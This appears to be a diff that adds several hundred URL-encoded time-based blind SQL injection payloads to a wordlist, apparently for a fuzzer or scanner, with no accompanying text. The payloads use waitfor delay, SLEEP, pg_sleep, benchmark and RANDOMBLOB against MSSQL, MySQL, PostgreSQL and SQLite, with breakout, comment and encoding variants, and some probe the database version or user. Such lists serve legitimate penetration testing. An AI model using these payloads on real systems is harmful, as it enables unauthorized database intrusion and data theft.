+'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
++waitfor+delay+'0:0:20'+/*
++waitfor+delay+'0:0:20'+--
+'+waitfor+delay+'0:0:20'+/*
+'+waitfor+delay+'0:0:20'+--
+"+waitfor+delay+'0:0:20'+/*
+"+waitfor+delay+'0:0:20'+--
+)+waitfor+delay+'0:0:20'+/*
+)+waitfor+delay+'0:0:20'+--
+))+waitfor+delay+'0:0:20'+/*
+))+waitfor+delay+'0:0:20'+--
+)))+waitfor+delay+'0:0:20'+/*
+)))+waitfor+delay+'0:0:20'+--
+))))+waitfor+delay+'0:0:20'+/*
+))))+waitfor+delay+'0:0:20'+--
+)))))+waitfor+delay+'0:0:20'+--
+))))))+waitfor+delay+'0:0:20'+--
+')+waitfor+delay+'0:0:20'+/*
+')+waitfor+delay+'0:0:20'+--
+")+waitfor+delay+'0:0:20'+/*
+")+waitfor+delay+'0:0:20'+--
+'))+waitfor+delay+'0:0:20'+/*
+'))+waitfor+delay+'0:0:20'+--
+"))+waitfor+delay+'0:0:20'+/*
+"))+waitfor+delay+'0:0:20'+--
+')))+waitfor+delay+'0:0:20'+/*
+')))+waitfor+delay+'0:0:20'+--
+")))+waitfor+delay+'0:0:20'+/*
+")))+waitfor+delay+'0:0:20'+--
+'))))+waitfor+delay+'0:0:20'+/*
+'))))+waitfor+delay+'0:0:20'+--
+"))))+waitfor+delay+'0:0:20'+/*
+"))))+waitfor+delay+'0:0:20'+--
+')))))+waitfor+delay+'0:0:20'+/*
+')))))+waitfor+delay+'0:0:20'+--
+")))))+waitfor+delay+'0:0:20'+/*
+")))))+waitfor+delay+'0:0:20'+--
+'))))))+waitfor+delay+'0:0:20'+/*
+'))))))+waitfor+delay+'0:0:20'+--
+"))))))+waitfor+delay+'0:0:20'+/*
+"))))))+waitfor+delay+'0:0:20'+--
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
++and+0=benchmark(3000000,MD5(1))%20/*
++and+0=benchmark(3000000,MD5(1))%20--
++and+0=benchmark(3000000,MD5(1))%20%23
+'+and+0=benchmark(3000000,MD5(1))%20/*
+'+and+0=benchmark(3000000,MD5(1))%20--
+'+and+0=benchmark(3000000,MD5(1))%20%23
+"+and+0=benchmark(3000000,MD5(1))%20/*
+"+and+0=benchmark(3000000,MD5(1))%20--
+"+and+0=benchmark(3000000,MD5(1))%20%23
+)+and+0=benchmark(3000000,MD5(1))%20/*
+)+and+0=benchmark(3000000,MD5(1))%20--
+)+and+0=benchmark(3000000,MD5(1))%20%23
+))+and+0=benchmark(3000000,MD5(1))%20/*
+))+and+0=benchmark(3000000,MD5(1))%20--
+))+and+0=benchmark(3000000,MD5(1))%20%23
+)))+and+0=benchmark(3000000,MD5(1))%20/*
+)))+and+0=benchmark(3000000,MD5(1))%20--
+)))+and+0=benchmark(3000000,MD5(1))%20%23
+))))+and+0=benchmark(3000000,MD5(1))%20/*
+))))+and+0=benchmark(3000000,MD5(1))%20--
+))))+and+0=benchmark(3000000,MD5(1))%20%23
+')+and+0=benchmark(3000000,MD5(1))%20/*
+')+and+0=benchmark(3000000,MD5(1))%20--
+')+and+0=benchmark(3000000,MD5(1))%20%23
+")+and+0=benchmark(3000000,MD5(1))%20/*
+")+and+0=benchmark(3000000,MD5(1))%20--
+")+and+0=benchmark(3000000,MD5(1))%20%23
+'))+and+0=benchmark(3000000,MD5(1))%20/*
+'))+and+0=benchmark(3000000,MD5(1))%20--
+'))+and+0=benchmark(3000000,MD5(1))%20%23
+"))+and+0=benchmark(3000000,MD5(1))%20/*
+"))+and+0=benchmark(3000000,MD5(1))%20--
+"))+and+0=benchmark(3000000,MD5(1))%20%23
+')))+and+0=benchmark(3000000,MD5(1))%20/*
+')))+and+0=benchmark(3000000,MD5(1))%20--
+')))+and+0=benchmark(3000000,MD5(1))%20%23
+")))+and+0=benchmark(3000000,MD5(1))%20/*
+")))+and+0=benchmark(3000000,MD5(1))%20--
+")))+and+0=benchmark(3000000,MD5(1))%20%23
+'))))+and+0=benchmark(3000000,MD5(1))%20/*
+'))))+and+0=benchmark(3000000,MD5(1))%20--
+'))))+and+0=benchmark(3000000,MD5(1))%20%23
+"))))+and+0=benchmark(3000000,MD5(1))%20/*
+"))))+and+0=benchmark(3000000,MD5(1))%20--
+"))))+and+0=benchmark(3000000,MD5(1))%20%23
+sleep(5)#
+1+or+sleep(5)#
+"+or+sleep(5)#
+'+or+sleep(5)#
+"+or+sleep(5)="
+'+or+sleep(5)='
+1)+or+sleep(5)#
+")+or+sleep(5)="
+')+or+sleep(5)='
+1))+or+sleep(5)#
+"))+or+sleep(5)="
+'))+or+sleep(5)='
+;waitfor+delay+'0:0:5'--
+);waitfor+delay+'0:0:5'--
+';waitfor+delay+'0:0:5'--
+";waitfor+delay+'0:0:5'--
+');waitfor+delay+'0:0:5'--
+");waitfor+delay+'0:0:5'--
+));waitfor+delay+'0:0:5'--
+'));waitfor+delay+'0:0:5'--
+"));waitfor+delay+'0:0:5'--
+benchmark(10000000,MD5(1))#
+1+or+benchmark(10000000,MD5(1))#
+"+or+benchmark(10000000,MD5(1))#
+'+or+benchmark(10000000,MD5(1))#
+1)+or+benchmark(10000000,MD5(1))#
+")+or+benchmark(10000000,MD5(1))#
+')+or+benchmark(10000000,MD5(1))#
+1))+or+benchmark(10000000,MD5(1))#
+"))+or+benchmark(10000000,MD5(1))#
+'))+or+benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1+or+pg_sleep(5)--
+"+or+pg_sleep(5)--
+'+or+pg_sleep(5)--
+1)+or+pg_sleep(5)--
+")+or+pg_sleep(5)--
+')+or+pg_sleep(5)--
+1))+or+pg_sleep(5)--
+"))+or+pg_sleep(5)--
+'))+or+pg_sleep(5)--
+AND+(SELECT+*FROM+(SELECT(SLEEP(5)))bAKL)+AND+'vRxe'='vRxe
+AND+(SELECT+*FROM+(SELECT(SLEEP(5)))YjoC)+AND+'%'='
+AND+(SELECT+*FROM+(SELECT(SLEEP(5)))nQIP)
+AND+(SELECT+*FROM+(SELECT(SLEEP(5)))nQIP)--
+AND+(SELECT+*FROM+(SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or+SLEEP(5)
+or+SLEEP(5)#
+or+SLEEP(5)--
+or+SLEEP(5)="
+or+SLEEP(5)='
+waitfor+delay+'00:00:05'
+waitfor+delay+'00:00:05'--
+waitfor+delay+'00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or+benchmark(50000000,MD5(1))
+or+benchmark(50000000,MD5(1))--
+or+benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or+pg_SLEEP(5)
+or+pg_SLEEP(5)--
+or+pg_SLEEP(5)#
+'\"
+AnD+SLEEP(5)
+AnD+SLEEP(5)--
+AnD+SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+'+AnD+SLEEP(5)+ANd+'1
+'&&SLEEP(5)&&'1
+ORDER+BY+SLEEP(5)
+ORDER+BY+SLEEP(5)--
+ORDER+BY+SLEEP(5)#
+(SELECT+*FROM+(SELECT(SLEEP(5)))ecMj)
+(SELECT+*FROM+(SELECT(SLEEP(5)))ecMj)#
+(SELECT+*FROM+(SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+'
+++SLEEP(10)+++'
+RANDOMBLOB(500000000/2)
+AND+2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR+2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND+2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR+2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*'+or+SLEEP(1)+or+'"+or+SLEEP(1)+or+"*/
++waitfor+delay+'0:0:20'+/*
++waitfor+delay+'0:0:20'+--
+'+waitfor+delay+'0:0:20'+/*
+'+waitfor+delay+'0:0:20'+--
+"+waitfor+delay+'0:0:20'+/*
+"+waitfor+delay+'0:0:20'+--
+)+waitfor+delay+'0:0:20'+/*
+)+waitfor+delay+'0:0:20'+--
+))+waitfor+delay+'0:0:20'+/*
+))+waitfor+delay+'0:0:20'+--
+)))+waitfor+delay+'0:0:20'+/*
+)))+waitfor+delay+'0:0:20'+--
+))))+waitfor+delay+'0:0:20'+/*
+))))+waitfor+delay+'0:0:20'+--
+)))))+waitfor+delay+'0:0:20'+--
+))))))+waitfor+delay+'0:0:20'+--
+')+waitfor+delay+'0:0:20'+/*
+')+waitfor+delay+'0:0:20'+--
+")+waitfor+delay+'0:0:20'+/*
+")+waitfor+delay+'0:0:20'+--
+'))+waitfor+delay+'0:0:20'+/*
+'))+waitfor+delay+'0:0:20'+--
+"))+waitfor+delay+'0:0:20'+/*
+"))+waitfor+delay+'0:0:20'+--
+')))+waitfor+delay+'0:0:20'+/*
+')))+waitfor+delay+'0:0:20'+--
+")))+waitfor+delay+'0:0:20'+/*
+")))+waitfor+delay+'0:0:20'+--
+'))))+waitfor+delay+'0:0:20'+/*
+'))))+waitfor+delay+'0:0:20'+--
+"))))+waitfor+delay+'0:0:20'+/*
+"))))+waitfor+delay+'0:0:20'+--
+')))))+waitfor+delay+'0:0:20'+/*
+')))))+waitfor+delay+'0:0:20'+--
+")))))+waitfor+delay+'0:0:20'+/*
+")))))+waitfor+delay+'0:0:20'+--
+'))))))+waitfor+delay+'0:0:20'+/*
+'))))))+waitfor+delay+'0:0:20'+--
+"))))))+waitfor+delay+'0:0:20'+/*
+"))))))+waitfor+delay+'0:0:20'+--
+1%27%3b+waitfor+delay+%270%3a0%3a5%27+-%0a
+%27+AND+%28SELECT+6377+FROM+%28SELECT%28SLEEP%285%29%29%29hLTl%29--%0a
+%27+WAITFOR+DELAY+%270%3a0%3a5%27--%0a
+%27%3bWAITFOR+DELAY+%270%3a0%3a5%27--%0a
+%27%29%29+or+sleep%285%29%3d%27%0a
+%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%27%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+"%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%27%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+"%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%27XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%285%2a5%29%2c0%29%29OR%27%0a
+%27XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%285%2a5%2a0%29%2c0%29%29OR%27%0a
+%27XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%286%2a6-30%29%2c0%29%29OR%27%0a
+%27xor%28if%28now%28%29%3dsysdate%28%29%2csleep%2810%29%2c0%29%29or%27%0a
+%2bor%2bsleep%280.000000001%29%0a
+AND+SLEEP%2815%29%0a
+%2520AND%2520SLEEP%2815%29%0a
+%252c%28select%2afrom%28select%28sleep%2830%29%29%29a%29%0a
+-sleep%285%29%0a
+-benchmark%281000000000%2c1-1%29%0a
+%27%252b%28select%2afrom%28select%28sleep%282%29%29%29a%29%252b%27%0a
+%27%2b%28select%2afrom%28select%28sleep%282%29%29%29a%29%2b%27%0a
+%27%252bIF%28MID%28%40%40version%2c1%2c1%29%3d4%2csleep%282%29%2c1%29%3d2%252b%27%0a
+%27%2bIF%28MID%28%40%40version%2c1%2c1%29%3d4%2csleep%282%29%2c1%29%3d2%2b%27%0a
+%28select%280%29from%28select%28sleep%2825%29%29%29v%29%0a
+-sleep%2f%2af%2a%2f%2810%29%0a
+-if%28mid%28version%2f%2af%2a%2f%28%29%2c1%2c1%29%3d5%2csleep%2f%2af%2a%2f%285%29%2c0%0a
+-if%28mid%28version%2f%2af%2a%2f%28%29%2c1%2c1%29%3d4%2csleep%2f%2af%2a%2f%285%29%2c0%29%0a
+%27%3bSELECT+1%3bSELECT+pg_sleep%2830%29%3b--%27%0a
+%2527%253BSELECT%25201%253BSELECT%2520pg_sleep%2830%29%253B--%2527%0a
+AND+SLEEP%287%29%23+%2c+%2520AND%2520SLEEP%287%29%2523%0a
+AND+SLEEP%287%29%23%0a
+%2520SLEEP%287%29%2523%0a
+SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29a%29%0a
+%27%3dsleep%2810%29%3d%271%0a
+%27%3dIF%28MID%28VERSION%28%29%2c1%2c1%29%3d1%2cSLEEP%2810%29%2c0%29%3d%271%0a
+%27%3dIF%28MID%28VERSION%28%29%2c1%2c1%29%3d5%2cSLEEP%2810%29%2c0%29%3d%271%0a
+%28select%2afrom%28select%28sleep%285%29%29%29a%29%0a
+SLEEP%2825%29%0a
+%2bor%2b1%253d%28%28SELECT%2b1%2bFROM%2b%28SELECT%2bSLEEP%2825%29%29A%29%29%0a
+%2bor%2b1%3d%28%28SELECT%2b1%2bFROM%2b%28SELECT%2bSLEEP%2825%29%29A%29%29%0a
+%27%252b%28select%2afrom%28select%28sleep%283%29%29%29a%29%252b%27%0a
+%27%252b%28select%2afrom%28select%28sleep%280%29%29%29a%29%252b%0a
+%27+or+sleep%285%29+%23%0a
+%2f%2a%27XOR%28if%282%3d2%2csleep%2810%29%2c0%29%29OR%27%0a
+%2520AND%2520%28SELECT%2520%2a%2520FROM%2520%28SELECT%28SLEEP%281%29%29%29WUeh%29%0a
+if%28now%28%29%3dsysdate%28%29%2csleep%2810%29%2c0%29%2f%27XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%2810%29%2c0%29%29OR%27"XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%2810%29%2c0%29+and+1%3d1%29"%2f%0a
+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%281%29%29%29WUeh%29%0a
+pg_sleep%2830%29--%0a
+%252c%28select%2afrom%28select%28sleep%2830%29%29%29a%29%0a
+-CASE%2f%2a%2a%2fWHEN%28LENGTH%28version%28%29%29%3d10%29THEN%28SLEEP%286%2a1%29%29END%26city_id%3d0%0a
+%29%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+"%3bwaitfor+delay+%270%3a0%3a__TIME_%0a
+%3bwaitfor+delay+%270%3a0%3a__TIME__%27--%0a
+"%29%3bwaitfor+delay+%270%3a0%3a__TIME__%27--%0a
+%27%2520and%2520%28select%2520%2a%2520from%2520%28select%28if%28substring%28user%28%29%2c1%2c1%29%3d%27p%27%2csleep%285%29%2c1%29%29%29a%29--%2520%3b%0a
+%27%252bbenchmark%2810000000%252csha1%281%29%29%252b%27%0a
+%27%252%2520and%2520+if%28substring%28user%28%29%2c1%2c1%29%3d%27c%27%2cSLEEP%283%29%2c1%29%252b%27%0a
+"%29%29+or+sleep%28__TIME__%29%3d"%0a
+"%29+or+pg_sleep%28__TIME__%29--%0a
+1+or+pg_sleep%28__TIME__%29--%0a
+%29%29+or+pg_sleep%28__TIME__%29--%0a
+1%29%29+or+sleep%28__TIME__%29%23%0a
+%29%29+or+sleep%28__TIME__%29%3d%27%0a
+"%29%29+or+pg_sleep%28__TIME__%29--%0a
+%27%29%29+or+sleep%285%29%3d%27%0a
+%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%27%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+"%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%27%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+"%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%29%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+"+or+sleep%28__TIME__%29%23%0a
+pg_sleep%28__TIME__%29--%0a
+1%29+or+sleep%28__TIME__%29%23%0a
